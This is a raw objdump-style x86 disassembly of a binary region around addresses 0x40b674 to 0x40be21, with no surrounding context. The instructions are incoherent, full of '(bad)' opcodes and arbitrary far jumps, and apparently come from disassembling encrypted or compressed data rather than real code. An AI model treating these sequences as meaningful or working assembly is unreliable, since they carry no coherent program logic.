  40b674:	outs   dx,DWORD PTR ds:[esi]
  40b675:	push   esi
  40b676:	pushf  
  40b677:	xchg   esi,eax
  40b678:	aas    
  40b679:	jns    0x40b6e0
  40b67b:	mov    esp,0x9db1bd98
  40b680:	ds sti 
  40b682:	(bad)  
  40b683:	retf   
  40b684:	test   BYTE PTR [eax-0x65efe241],ch
  40b68a:	inc    edi
  40b68b:	xchg   ecx,eax
  40b68c:	pop    ebp
  40b68d:	push   ebp
  40b68e:	sbb    ecx,ecx
  40b690:	sbb    bl,BYTE PTR [esi+0x1]
  40b693:	mov    esi,0xa367a265
  40b698:	mov    cl,0xda
  40b69a:	loop   0x40b6b8
  40b69c:	push   0xffffffb0
  40b69e:	cmp    esp,DWORD PTR [eax-0x51]
  40b6a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b6a2:	mov    ebp,0xbb61a304
  40b6a7:	clc    
  40b6a8:	add    BYTE PTR [esi],0x65
  40b6ab:	xor    ebx,esp
  40b6ad:	or     BYTE PTR [edi],dl
  40b6af:	adc    esi,0x1b13ceb6
  40b6b5:	jnp    0x40b727
  40b6b7:	mov    ebp,0xa9e92604
  40b6bc:	fmul   DWORD PTR fs:[esi+ebp*1]
  40b6c0:	sbb    esp,ebx
  40b6c2:	mov    bl,0x9f
  40b6c4:	rol    cl,0xee
  40b6c7:	add    DWORD PTR [esp+eiz*8],esi
  40b6ca:	sbb    ch,BYTE PTR [edx]
  40b6cc:	out    0x10,eax
  40b6ce:	xchg   BYTE PTR ds:[eax+0x7bf8a53a],ch
  40b6d5:	mov    ebp,0x9393ce14
  40b6da:	adc    DWORD PTR [ebx],esp
  40b6dc:	jbe    0x40b6b0
  40b6de:	xor    bl,0x75
  40b6e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b6e2:	sub    al,0x80
  40b6e4:	sbb    edi,esi
  40b6e6:	fcomp  DWORD PTR [ebx+eiz*2-0x67]
  40b6ea:	loope  0x40b70a
  40b6ec:	scas   eax,DWORD PTR es:[edi]
  40b6ed:	retf   
  40b6ee:	ins    DWORD PTR es:[edi],dx
  40b6ef:	mov    eax,ds:0x6dc4d0bc
  40b6f4:	mov    BYTE PTR [esi-0x1b],bl
  40b6f7:	into   
  40b6f8:	aad    0x34
  40b6fa:	add    al,ch
  40b6fc:	lods   eax,DWORD PTR ds:[esi]
  40b6fd:	mov    eax,ds:0x8a821cb9
  40b702:	std    
  40b703:	stc    
  40b704:	(bad)  
  40b705:	das    
  40b706:	or     DWORD PTR [edi],esp
  40b708:	jge    0x40b6c2
  40b70a:	in     al,dx
  40b70b:	mov    ah,0x3e
  40b70d:	leave  
  40b70e:	cmp    al,0xe6
  40b710:	retf   0xea74
  40b713:	xchg   ebp,eax
  40b714:	xchg   ebp,eax
  40b715:	pop    ss
  40b716:	and    DWORD PTR [eax+0x49],esp
  40b719:	pop    ebp
  40b71a:	imul   ebp,DWORD PTR [edi-0x6722cae3],0xda201382
  40b724:	lods   eax,DWORD PTR ds:[esi]
  40b725:	loop   0x40b784
  40b727:	xor    eax,0xff49569
  40b72c:	push   edx
  40b72d:	test   eax,0x6ad3b803
  40b732:	fimul  DWORD PTR [edi]
  40b734:	inc    esi
  40b735:	rcl    bl,cl
  40b737:	jne    0x40b73d
  40b739:	js     0x40b762
  40b73b:	retf   0x4645
  40b73e:	jle    0x40b742
  40b740:	mov    ebx,DWORD PTR [esi+0x79]
  40b743:	dec    edx
  40b744:	and    edx,DWORD PTR [ebx+0x37cca29b]
  40b74a:	xchg   edi,eax
  40b74b:	test   BYTE PTR [edi+0x64d18edd],bl
  40b751:	inc    DWORD PTR [edi+0xc03e7a0]
  40b757:	ror    DWORD PTR [edi+ebx*2],1
  40b75a:	loopne 0x40b739
  40b75c:	aas    
  40b75d:	ss mov ah,0x96
  40b760:	sub    al,0x2a
  40b762:	mov    al,0x63
  40b764:	ror    DWORD PTR [ebx],1
  40b766:	sbb    BYTE PTR [eax],ch
  40b768:	cmp    BYTE PTR [ebx+0x5f],dh
  40b76b:	dec    edi
  40b76c:	inc    esp
  40b76d:	cli    
  40b76e:	fimul  WORD PTR ds:0x39d0bd55
  40b774:	or     DWORD PTR [ebx+0x1c],ebp
  40b777:	and    BYTE PTR [edi],cl
  40b779:	das    
  40b77a:	fwait
  40b77b:	adc    cl,BYTE PTR [edx]
  40b77d:	cld    
  40b77e:	popa   
  40b77f:	inc    ebp
  40b780:	loop   0x40b7b9
  40b782:	out    0x75,eax
  40b784:	push   edx
  40b785:	ret    0x56b
  40b788:	out    0x98,al
  40b78a:	mul    DWORD PTR [ecx+0x60]
  40b78d:	push   cs
  40b78e:	push   edx
  40b78f:	dec    ecx
  40b790:	clc    
  40b791:	stos   BYTE PTR es:[edi],al
  40b792:	xchg   esi,eax
  40b793:	movaps XMMWORD PTR [ebx+0x2e],xmm6
  40b797:	inc    edi
  40b798:	and    dl,BYTE PTR [edi-0x51]
  40b79b:	(bad)  
  40b79c:	xor    ch,BYTE PTR [eax+0x73]
  40b79f:	das    
  40b7a0:	push   ebx
  40b7a1:	dec    esi
  40b7a2:	inc    ebx
  40b7a3:	add    BYTE PTR [edx-0x59ee736a],bl
  40b7a9:	mov    ebp,0xd068633
  40b7ae:	xor    esp,eax
  40b7b0:	ret    0x965f
  40b7b3:	pop    edx
  40b7b4:	nop
  40b7b5:	lods   eax,DWORD PTR ds:[esi]
  40b7b6:	outs   dx,DWORD PTR ds:[esi]
  40b7b7:	fisubr DWORD PTR [ecx+0x50325222]
  40b7bd:	aad    0x98
  40b7bf:	xchg   edx,eax
  40b7c0:	in     eax,dx
  40b7c1:	pop    DWORD PTR [eiz*2-0x72256fa0]
  40b7c8:	dec    edi
  40b7c9:	lds    edx,FWORD PTR [ecx-0x6a]
  40b7cc:	cmp    eax,0x490c9bc9
  40b7d1:	addr16 cli 
  40b7d3:	jb     0x40b804
  40b7d5:	inc    edx
  40b7d6:	jnp    0x40b759
  40b7d8:	sbb    DWORD PTR [ebp+0x2e],eax
  40b7db:	arpl   WORD PTR [ebx+0xd],ax
  40b7de:	jo     0x40b7b2
  40b7e0:	or     ecx,DWORD PTR [eax+0x1513861a]
  40b7e6:	rcl    DWORD PTR [ebx+0x78d86c5f],0x34
  40b7ed:	and    ebp,DWORD PTR [edx]
  40b7ef:	(bad)  
  40b7f0:	jae    0x40b849
  40b7f2:	lods   al,BYTE PTR ds:[esi]
  40b7f3:	pop    ecx
  40b7f4:	dec    ebp
  40b7f5:	adc    ch,BYTE PTR [ecx]
  40b7f7:	sub    dh,ch
  40b7f9:	div    DWORD PTR [eax-0x7ee48103]
  40b7ff:	repnz mov eax,0x166aff89
  40b805:	xchg   edi,eax
  40b806:	mov    ds:0x4876e007,eax
  40b80b:	sti    
  40b80c:	dec    ebx
  40b80d:	imul   edx,eax,0xbdc2862c
  40b813:	dec    edi
  40b814:	(bad)  
  40b815:	imul   ebx,esi,0xffffff8a
  40b818:	(bad)  
  40b819:	adc    ah,BYTE PTR [ebp-0x10]
  40b81c:	lds    ebx,FWORD PTR [edi]
  40b81e:	cli    
  40b81f:	(bad)  
  40b821:	dec    esi
  40b822:	pop    ds
  40b823:	into   
  40b824:	lds    esp,FWORD PTR [eax]
  40b826:	push   es
  40b827:	loope  0x40b8a3
  40b829:	ss jmp 0x176d5b46
  40b82f:	loop   0x40b854
  40b831:	cmp    eax,0xc74bcfc4
  40b836:	scas   eax,DWORD PTR es:[edi]
  40b837:	mov    ds:0x8fb8fb95,eax
  40b83c:	mov    bh,0x84
  40b83e:	xor    bl,BYTE PTR [edi]
  40b840:	ret    0x75d8
  40b843:	into   
  40b844:	call   0x8739:0x7cc92dd1
  40b84b:	inc    ecx
  40b84c:	aaa    
  40b84d:	xstore-rng (bad)
  40b84e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b84f:	(bad)
  40b852:	adc    dl,BYTE PTR [edx+0x69]
  40b855:	mov    al,ds:0xa7f1afbd
  40b85a:	sbb    eax,0xd6f18d15
  40b85f:	retf   
  40b860:	pop    es
  40b861:	rol    BYTE PTR es:[ecx+ebp*2+0xb],1
  40b866:	popf   
  40b867:	ins    BYTE PTR es:[edi],dx
  40b868:	and    eax,0x90550718
  40b86d:	mov    ah,0x9
  40b86f:	xor    edx,ebp
  40b871:	xchg   edx,eax
  40b872:	into   
  40b873:	out    dx,eax
  40b874:	lea    eax,[ebx]
  40b876:	test   eax,0xb6c33b7a
  40b87b:	in     al,dx
  40b87c:	lods   al,BYTE PTR ds:[esi]
  40b87d:	js     0x40b82c
  40b87f:	mov    dl,0xc2
  40b881:	out    dx,al
  40b882:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b883:	mov    bl,0x69
  40b885:	sar    BYTE PTR [ecx+ebp*2-0x1f],0x60
  40b88a:	fwait
  40b88b:	push   0x5ad0a152
  40b890:	or     dh,BYTE PTR [eax-0x39d59b9a]
  40b896:	mov    esi,0xaf84fa82
  40b89b:	push   ebp
  40b89c:	xor    ecx,eax
  40b89e:	int    0x82
  40b8a0:	loopne 0x40b8b3
  40b8a2:	pop    esp
  40b8a3:	dec    ebx
  40b8a4:	and    ebx,DWORD PTR [ecx-0x1b]
  40b8a7:	and    DWORD PTR ds:0xa9006195,ecx
  40b8ad:	mov    edi,0xeb15dbbc
  40b8b2:	popf   
  40b8b3:	adc    al,0x68
  40b8b5:	rcl    BYTE PTR [esi-0x67],cl
  40b8b8:	mov    esp,0x6b6d8387
  40b8bd:	call   0x98c405d8
  40b8c2:	imul   ebp,DWORD PTR [ebx],0x91161b8
  40b8c8:	ja     0x40b8ca
  40b8ca:	jae    0x40b8fb
  40b8cc:	inc    esi
  40b8cd:	ror    bl,1
  40b8cf:	es jge 0x40b8fe
  40b8d2:	pop    ds
  40b8d3:	or     esi,esp
  40b8d5:	add    edx,DWORD PTR [eax-0x71f06f2f]
  40b8db:	loope  0x40b906
  40b8dd:	je     0x40b936
  40b8df:	cmp    BYTE PTR [ecx+0x4a8280df],ch
  40b8e5:	xchg   edx,eax
  40b8e6:	xor    BYTE PTR fs:[esi],0x36
  40b8ea:	xchg   esi,eax
  40b8eb:	(bad)  [ebx]
  40b8ed:	lds    edx,FWORD PTR [edx-0x3c5be056]
  40b8f3:	in     al,dx
  40b8f4:	mov    dl,0xd0
  40b8f6:	icebp  
  40b8f7:	xchg   edx,eax
  40b8f8:	sbb    DWORD PTR [ecx-0x119e26f8],ecx
  40b8fe:	cli    
  40b8ff:	inc    ebp
  40b900:	cmp    ebx,DWORD PTR [ecx]
  40b902:	push   ss
  40b903:	mov    edx,0x234c4cc2
  40b908:	cdq    
  40b909:	cmp    ecx,esp
  40b90b:	not    BYTE PTR [ecx]
  40b90d:	mov    dl,0x7f
  40b90f:	jg     0x40b960
  40b911:	mov    esp,0x13351753
  40b916:	daa    
  40b917:	lea    esi,[edi+0x16]
  40b91a:	jmp    0x40b992
  40b91c:	shl    DWORD PTR [edi+0x7cd12022],0x66
  40b923:	mov    cl,0x4d
  40b925:	icebp  
  40b926:	out    dx,eax
  40b927:	fwait
  40b928:	xchg   ebp,eax
  40b929:	inc    ebp
  40b92a:	pop    ebx
  40b92b:	shl    BYTE PTR [ebx],cl
  40b92d:	mov    esp,DWORD PTR [ecx-0x4e]
  40b930:	or     BYTE PTR [ecx+edi*8],bh
  40b933:	and    ch,bl
  40b935:	jp     0x40b8d0
  40b937:	and    eax,DWORD PTR [ebx+eiz*8]
  40b93a:	inc    ebx
  40b93b:	sub    eax,0x66f60564
  40b940:	or     eax,0x2e05a60c
  40b945:	ja     0x40b9a3
  40b947:	adc    al,0x4a
  40b949:	enter  0x3ef8,0xeb
  40b94d:	jl     0x40b93c
  40b94f:	fwait
  40b950:	mov    eax,0x9d201a09
  40b955:	jl     0x40b9cd
  40b957:	and    BYTE PTR [eax+0x10],dl
  40b95a:	sub    al,0xa1
  40b95c:	sbb    esi,DWORD PTR [edx]
  40b95e:	push   ebx
  40b95f:	(bad)  
  40b960:	adc    al,0x6d
  40b962:	xor    BYTE PTR [eax+0x31],0x40
  40b966:	dec    esi
  40b967:	cdq    
  40b968:	and    cl,BYTE PTR [esi+0x3f934b33]
  40b96e:	aad    0xa8
  40b970:	push   edx
  40b971:	(bad)  
  40b973:	loop   0x40b9c5
  40b975:	add    eax,0x3905022d
  40b97a:	sbb    BYTE PTR [esi+0x40],bl
  40b97d:	sti    
  40b97e:	and    esp,DWORD PTR [ecx+0x1a]
  40b981:	test   al,0x77
  40b983:	pop    edx
  40b984:	jge    0x40b95b
  40b986:	frstor [esi+0x226189b]
  40b98c:	xor    ebx,DWORD PTR [esi]
  40b98e:	shl    edx,1
  40b990:	in     eax,dx
  40b991:	adc    ebx,DWORD PTR [ecx-0x10]
  40b994:	jle    0x40b9ed
  40b996:	or     al,0x44
  40b998:	mov    bl,0xe
  40b99a:	or     eax,0xfc69d0c5
  40b99f:	cdq    
  40b9a0:	fwait
  40b9a1:	jge    0x40ba0d
  40b9a3:	idiv   edx
  40b9a5:	sub    eax,0xc2b2eaec
  40b9aa:	inc    edi
  40b9ab:	gs jo  0x40ba16
  40b9ae:	cmp    DWORD PTR [edx+edi*1+0x23],0xd0ad6fdc
  40b9b6:	fiadd  DWORD PTR [edi+ebp*8+0x635b6f8]
  40b9bd:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  40b9bf:	sbb    al,0xab
  40b9c1:	mov    al,0x5
  40b9c3:	out    dx,al
  40b9c4:	xchg   ecx,eax
  40b9c5:	test   al,0x58
  40b9c7:	jb     0x40ba02
  40b9c9:	arpl   WORD PTR [ebx],ax
  40b9cb:	push   esp
  40b9cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b9cd:	xchg   al,bh
  40b9cf:	mov    edx,0xe0927f97
  40b9d4:	shl    DWORD PTR [ecx-0x7d9abcbc],1
  40b9da:	lea    edi,[ebp+0x4b224894]
  40b9e0:	sbb    al,0xfc
  40b9e2:	push   edi
  40b9e3:	test   al,0xfc
  40b9e5:	cli    
  40b9e6:	mov    ds:0xd6ad595b,al
  40b9eb:	xchg   esp,eax
  40b9ec:	and    cl,BYTE PTR [ebp+0x51e15cd6]
  40b9f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b9f3:	popa   
  40b9f4:	clc    
  40b9f5:	loop   0x40ba53
  40b9f7:	push   cs
  40b9f8:	out    dx,al
  40b9f9:	xlat   BYTE PTR ds:[ebx]
  40b9fa:	test   al,0x27
  40b9fd:	sub    al,0x75
  40b9ff:	xchg   BYTE PTR [esp+ebx*1],bl
  40ba02:	fadd   QWORD PTR [edx*8+0xa1c5173]
  40ba09:	call   0x31e8:0xc3f2e02
  40ba10:	jo     0x40ba62
  40ba12:	fcmove st,st(3)
  40ba14:	leave  
  40ba15:	out    dx,eax
  40ba16:	into   
  40ba17:	inc    ebp
  40ba18:	stc    
  40ba19:	sbb    BYTE PTR [ebp+0x2d],ah
  40ba1c:	jne    0x40b9d3
  40ba1e:	jnp    0x40ba2b
  40ba20:	mov    edx,0x21002c0b
  40ba25:	js     0x40baa5
  40ba27:	adc    cl,BYTE PTR [eax+0x45f0ca56]
  40ba2d:	fucomp st(2)
  40ba2f:	add    al,0x18
  40ba31:	inc    esi
  40ba32:	in     al,0x5d
  40ba34:	cli    
  40ba35:	(bad)  
  40ba36:	lock push edi
  40ba38:	inc    esi
  40ba39:	loopne 0x40ba70
  40ba3b:	cdq    
  40ba3c:	lods   eax,DWORD PTR ds:[esi]
  40ba3d:	add    eax,0x2b65d53
  40ba42:	jne    0x40ba1b
  40ba44:	mov    esp,0x3c4dc81
  40ba49:	adc    al,BYTE PTR [edx]
  40ba4b:	inc    ecx
  40ba4c:	sub    edx,DWORD PTR [ebx-0x5b6dcf7c]
  40ba52:	(bad)  
  40ba53:	sti    
  40ba54:	fs call 0xc55b21a1
  40ba5a:	mov    gs,ebp
  40ba5c:	jno    0x40ba64
  40ba5e:	mov    al,0x53
  40ba60:	repz fidiv DWORD PTR [edx+0x20]
  40ba64:	pop    esi
  40ba65:	push   edx
  40ba66:	push   esi
  40ba67:	imul   esi,DWORD PTR [eax+0x39],0xc8a4ca41
  40ba6e:	mov    eax,ds:0x6cd19812
  40ba73:	mov    dl,BYTE PTR [esi-0xa]
  40ba76:	sub    DWORD PTR [ecx],edx
  40ba78:	or     BYTE PTR [edx+0x43],cl
  40ba7b:	jns    0x40ba9f
  40ba7d:	adc    DWORD PTR [edx+0x3db8064e],esp
  40ba83:	jns    0x40baa8
  40ba85:	call   DWORD PTR [edx]
  40ba87:	adc    DWORD PTR [ebx+0x57],ebx
  40ba8a:	(bad)  
  40ba8b:	sbb    al,0x2
  40ba8d:	adc    eax,0x719ec462
  40ba92:	mov    ds:0xbe2b1496,al
  40ba97:	xchg   esi,eax
  40ba98:	sub    BYTE PTR [eax],dl
  40ba9a:	ret    
  40ba9b:	or     cl,BYTE PTR [edi+0x27512b08]
  40baa1:	pop    edi
  40baa2:	clc    
  40baa3:	fwait
  40baa4:	or     DWORD PTR [ebx],esp
  40baa6:	pop    edx
  40baa7:	mov    bh,0x4b
  40baa9:	clc    
  40baaa:	out    0xbe,al
  40baac:	loope  0x40ba85
  40baae:	outs   dx,BYTE PTR ds:[esi]
  40baaf:	lods   eax,DWORD PTR ds:[esi]
  40bab0:	and    al,0x9a
  40bab2:	mov    DWORD PTR [ecx+0x6c],esi
  40bab5:	dec    esi
  40bab6:	stos   DWORD PTR es:[edi],eax
  40bab7:	int3   
  40bab8:	scas   eax,DWORD PTR es:[edi]
  40bab9:	jbe    0x40ba48
  40babb:	arpl   WORD PTR [edx],si
  40babd:	stc    
  40babe:	pop    ds
  40babf:	rol    bh,1
  40bac1:	aaa    
  40bac2:	ins    BYTE PTR es:[edi],dx
  40bac3:	jbe    0x40bac3
  40bac5:	outs   dx,DWORD PTR ds:[esi]
  40bac6:	inc    edi
  40bac7:	test   DWORD PTR ds:0x3e268529,ebp
  40bacd:	ds pop eax
  40bacf:	and    edi,ebx
  40bad1:	(bad)  
  40bad2:	pop    edi
  40bad3:	or     ah,BYTE PTR [edi]
  40bad5:	push   edx
  40bad6:	int3   
  40bad7:	(bad)  
  40bad8:	ficom  WORD PTR [ecx-0x53]
  40badb:	sub    BYTE PTR [ecx-0xe],0xf0
  40badf:	iret   
  40bae0:	xor    BYTE PTR ds:0xb3fd2259,ah
  40bae6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bae7:	mov    edi,0x9e0ea7ac
  40baed:	(bad)  
  40baf0:	add    al,0x50
  40baf2:	xchg   ebp,eax
  40baf3:	add    ebp,ebx
  40baf5:	inc    esi
  40baf6:	push   edx
  40baf7:	int3   
  40baf8:	data16 in al,dx
  40bafa:	out    0xdc,al
  40bafc:	and    al,0xe0
  40bafe:	cmp    cl,BYTE PTR ds:0xded3d923
  40bb04:	neg    BYTE PTR [ebx]
  40bb06:	(bad)  
  40bb07:	adc    eax,DWORD PTR [edx+0x9]
  40bb0a:	inc    edx
  40bb0b:	fist   DWORD PTR [esi+0x5]
  40bb0e:	pop    ss
  40bb0f:	int    0x84
  40bb11:	mov    dh,0xb0
  40bb13:	retf   0x7bde
  40bb16:	ds pop edi
  40bb18:	add    eax,0xa0621a6e
  40bb1d:	inc    ebx
  40bb1e:	sbb    esp,DWORD PTR [eax-0x17]
  40bb21:	jmp    0x519a:0xbed4fd41
  40bb28:	stos   DWORD PTR es:[edi],eax
  40bb29:	mov    ds:0xf6ae4318,al
  40bb2e:	push   es
  40bb2f:	sbb    BYTE PTR [edx],ch
  40bb31:	cs ja  0x40bb54
  40bb34:	sub    al,0x7d
  40bb36:	and    eax,0x9e7bcf55
  40bb3b:	sbb    eax,DWORD PTR [edx-0x41]
  40bb3e:	pop    ss
  40bb3f:	retf   0x32b1
  40bb42:	sbb    bl,BYTE PTR [eax+0x60eaef95]
  40bb48:	fadd   st,st(5)
  40bb4a:	adc    bh,bh
  40bb4c:	add    BYTE PTR ds:0x850a6be3,bl
  40bb52:	jg     0x40bbce
  40bb54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bb55:	and    eax,0x52707bd3
  40bb5a:	mov    al,bl
  40bb5c:	xchg   BYTE PTR [edi-0x3db9e717],ch
  40bb62:	lods   al,BYTE PTR ds:[esi]
  40bb63:	test   eax,0x93074c51
  40bb68:	add    edx,esp
  40bb6a:	out    dx,eax
  40bb6b:	jb     0x40bb7d
  40bb6d:	mov    bl,0x96
  40bb6f:	call   0xbdf3eb30
  40bb74:	mov    edx,0x3da3da38
  40bb79:	fild   DWORD PTR [esi+edi*2]
  40bb7c:	push   edi
  40bb7d:	outs   dx,DWORD PTR ds:[esi]
  40bb7e:	add    dh,BYTE PTR [ebp-0x15c8ccbd]
  40bb84:	mov    ebp,0x21d7508d
  40bb89:	mov    bh,0x32
  40bb8b:	sahf   
  40bb8c:	sub    ah,BYTE PTR [esi+0x46]
  40bb8f:	test   eax,eax
  40bb91:	push   esi
  40bb92:	push   edx
  40bb93:	stc    
  40bb94:	rol    BYTE PTR [ebp-0x7e365baa],0xc7
  40bb9b:	cld    
  40bb9c:	inc    ebp
  40bb9d:	jb     0x40bbb8
  40bb9f:	mov    cl,0xc8
  40bba1:	dec    esi
  40bba2:	xor    ebx,DWORD PTR [esp+ebx*1-0x6d]
  40bba6:	jmp    0x740715b2
  40bbab:	(bad)
  40bbae:	cmc    
  40bbaf:	jae    0x40bbb6
  40bbb1:	fdivr  QWORD PTR [eax+0x66]
  40bbb4:	inc    edx
  40bbb5:	pop    ds
  40bbb6:	(bad)  
  40bbb7:	mov    ebp,0x120864a
  40bbbc:	sbb    BYTE PTR [ecx-0x59],dh
  40bbbf:	dec    eax
  40bbc0:	mov    eax,0x94174bf2
  40bbc5:	lahf   
  40bbc6:	mov    WORD PTR [edi+0x15],gs
  40bbc9:	imul   ebx,ebp,0x604d950c
  40bbcf:	sar    DWORD PTR [esi],cl
  40bbd1:	imul   ecx,DWORD PTR [edi-0x65],0x87b85f1e
  40bbd8:	sub    DWORD PTR [eax+0x2321cf55],esi
  40bbde:	ret    0x6186
  40bbe1:	pop    eax
  40bbe2:	inc    ebx
  40bbe3:	pushf  
  40bbe4:	sbb    esi,ebx
  40bbe6:	call   FWORD PTR [esi+ebx*1+0x3]
  40bbea:	pop    ebp
  40bbeb:	out    0x7f,eax
  40bbed:	hlt    
  40bbee:	cmc    
  40bbef:	jg     0x40bb74
  40bbf1:	xor    al,0x60
  40bbf3:	cdq    
  40bbf4:	inc    ecx
  40bbf5:	enter  0xa31,0xab
  40bbf9:	mov    ch,0x6a
  40bbfb:	cmp    eax,0x6b4a8f38
  40bc00:	(bad)  
  40bc01:	jne    0x40bbb6
  40bc03:	sbb    bl,al
  40bc05:	inc    ebx
  40bc06:	neg    DWORD PTR [edx-0x6d]
  40bc09:	dec    ebp
  40bc0a:	mov    BYTE PTR [esi-0x6a],ch
  40bc0d:	mov    ds:0xe51d3c1,eax
  40bc12:	pop    ss
  40bc13:	mov    dh,0xbb
  40bc15:	jb     0x40bc7c
  40bc17:	or     esp,DWORD PTR [edi]
  40bc19:	das    
  40bc1a:	pop    ss
  40bc1b:	mov    ebx,0x7aebb25a
  40bc20:	imul   esp,DWORD PTR [edi+ecx*1-0x515b720d],0xc185a898
  40bc2b:	leave  
  40bc2c:	outs   dx,DWORD PTR ds:[esi]
  40bc2d:	fucomp st(2)
  40bc2f:	mov    esi,0x74a1b39b
  40bc34:	loop   0x40bc8a
  40bc36:	nop
  40bc37:	scas   al,BYTE PTR es:[edi]
  40bc38:	mov    ds:0x8f7e67dc,al
  40bc3d:	ins    DWORD PTR es:[edi],dx
  40bc3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bc3f:	jnp    0x40bc9f
  40bc41:	add    al,0xda
  40bc43:	add    ah,dl
  40bc45:	outs   dx,DWORD PTR ds:[esi]
  40bc46:	push   ecx
  40bc47:	(bad)  
  40bc49:	loop   0x40bbf8
  40bc4b:	pop    es
  40bc4c:	sub    al,0x95
  40bc4e:	cdq    
  40bc4f:	repnz pop esi
  40bc51:	fcom   QWORD PTR [ecx-0x2a910da7]
  40bc57:	enter  0x3467,0x39
  40bc5b:	add    bl,BYTE PTR [ebp+0x36]
  40bc5e:	or     DWORD PTR [esi],esi
  40bc60:	test   DWORD PTR [ecx-0x57540524],esp
  40bc66:	(bad)  
  40bc67:	mov    esp,0x2b547a07
  40bc6c:	stos   DWORD PTR es:[edi],eax
  40bc6d:	sbb    DWORD PTR [ecx],ebp
  40bc6f:	inc    ebp
  40bc70:	test   DWORD PTR [edi-0x181bd219],esp
  40bc76:	push   es
  40bc77:	sub    al,0x4e
  40bc79:	push   ebp
  40bc7a:	sbb    eax,0x2acf6454
  40bc7f:	cdq    
  40bc80:	mov    al,ds:0xa6670531
  40bc85:	or     BYTE PTR [ebx],cl
  40bc87:	cs (bad) 
  40bc89:	push   esi
  40bc8a:	inc    eax
  40bc8b:	dec    eax
  40bc8c:	popa   
  40bc8d:	xor    esp,DWORD PTR [ebx-0x45d4f42d]
  40bc93:	out    0x7d,eax
  40bc95:	jecxz  0x40bc39
  40bc97:	repnz add BYTE PTR [eax],al
	...
  40bd12:	add    BYTE PTR [eax],al
  40bd14:	pop    edx
  40bd15:	in     al,0xf9
  40bd17:	(bad)  
  40bd18:	(bad)  
  40bd19:	fnstsw WORD PTR [edi-0x2]
  40bd1c:	or     eax,0xd04271cc
  40bd21:	lahf   
  40bd22:	fs das 
  40bd24:	cdq    
  40bd25:	ins    DWORD PTR es:[edi],dx
  40bd26:	add    BYTE PTR [eax],al
  40bd28:	ins    BYTE PTR es:[edi],dx
  40bd29:	pop    es
  40bd2a:	add    BYTE PTR [eax],al
  40bd2c:	aas    
  40bd2d:	pusha  
  40bd2e:	dec    esi
  40bd2f:	dec    edi
  40bd30:	(bad)  
  40bd31:	imul   eax,DWORD PTR [ebp-0x71],0x6e559cf3
  40bd38:	xor    al,0x27
  40bd3a:	inc    edx
  40bd3b:	pop    ebp
  40bd3c:	lea    edx,[ebx+ebx*8+0x6b8ca12b]
  40bd43:	pop    es
  40bd44:	and    dh,cl
  40bd46:	out    dx,eax
  40bd47:	sahf   
  40bd48:	xor    BYTE PTR [edx],dl
  40bd4a:	sub    eax,0x97b1b779
  40bd4f:	sub    ah,dh
  40bd51:	call   0x352c9ed0
  40bd56:	xchg   ebp,eax
  40bd57:	adc    dl,BYTE PTR [esi]
  40bd59:	gs mov ecx,0x1bbd3f2d
  40bd5f:	pop    ss
  40bd60:	sub    edi,DWORD PTR es:[edx-0x76]
  40bd64:	dec    edi
  40bd65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bd66:	retf   0xd6bf
  40bd69:	and    eax,0xa983b089
  40bd6e:	in     eax,0x7
  40bd70:	dec    esi
  40bd71:	ds into 
  40bd73:	test   BYTE PTR [edi],ch
  40bd75:	jmp    0x3fde:0x6e63d02d
  40bd7c:	jmp    0x40bd57
  40bd7e:	les    edx,FWORD PTR [esi+0x458f0fc2]
  40bd84:	addr16 (bad) 
  40bd86:	call   0x637a9f95
  40bd8b:	mov    al,ds:0x36d2d17c
  40bd90:	pop    edi
  40bd91:	cdq    
  40bd92:	inc    ecx
  40bd93:	sub    al,0x67
  40bd95:	and    DWORD PTR [edx+edi*1],ebx
  40bd98:	mov    dl,0x98
  40bd9a:	jge    0x40bd3b
  40bd9c:	sbb    al,0x95
  40bd9e:	stos   DWORD PTR es:[edi],eax
  40bd9f:	push   ss
  40bda0:	aam    0xd8
  40bda2:	jmp    0xb4da87d2
  40bda7:	sbb    al,0x28
  40bda9:	add    edi,eax
  40bdab:	std    
  40bdac:	jns    0x40bde8
  40bdae:	cwde   
  40bdaf:	sbb    al,BYTE PTR [edi]
  40bdb1:	jae    0x40be00
  40bdb3:	sbb    ebp,eax
  40bdb5:	bound  ebx,QWORD PTR ss:[edx+0x76]
  40bdb9:	pop    ebp
  40bdba:	inc    ebx
  40bdbb:	fwait
  40bdbc:	and    BYTE PTR [ebx-0x6c],al
  40bdbf:	sub    ebx,edi
  40bdc1:	push   es
  40bdc2:	adc    ebx,0xf9ebd5b4
  40bdc8:	sbb    eax,0xd0f5e902
  40bdcd:	mov    ?,WORD PTR [ebp+0x7f84be73]
  40bdd3:	jmp    0x5446abe0
  40bdd8:	mov    esp,0x5921ea63
  40bddd:	pop    ebx
  40bdde:	call   0x2255:0xc8e2904d
  40bde5:	or     BYTE PTR [edi+0x14],dl
  40bde8:	mov    al,bl
  40bdea:	repnz in eax,0xff
  40bded:	lahf   
  40bdee:	lods   eax,DWORD PTR ds:[esi]
  40bdef:	jae    0x40be5e
  40bdf1:	ins    DWORD PTR es:[edi],dx
  40bdf2:	jnp    0x40bdf6
  40bdf4:	xchg   BYTE PTR [ecx],ch
  40bdf6:	xor    ch,ah
  40bdf8:	jge    0x40bde4
  40bdfa:	add    DWORD PTR gs:[esi-0x58],edx
  40bdfe:	mov    WORD PTR [edi+0xb237d5f],cs
  40be04:	scas   al,BYTE PTR es:[edi]
  40be05:	xor    eax,0x9157ab9b
  40be0a:	sub    dh,bh
  40be0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be0d:	bound  eax,QWORD PTR [ecx]
  40be0f:	scas   al,BYTE PTR es:[edi]
  40be10:	mov    esi,0xbe0ac5bb
  40be15:	(bad)  
  40be16:	stc    
  40be17:	adc    edx,DWORD PTR [esi+0x340797ca]
  40be1d:	scas   al,BYTE PTR es:[edi]
  40be1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40be1f:	dec    esp
  40be20:	std    
  40be21:	pop    edx
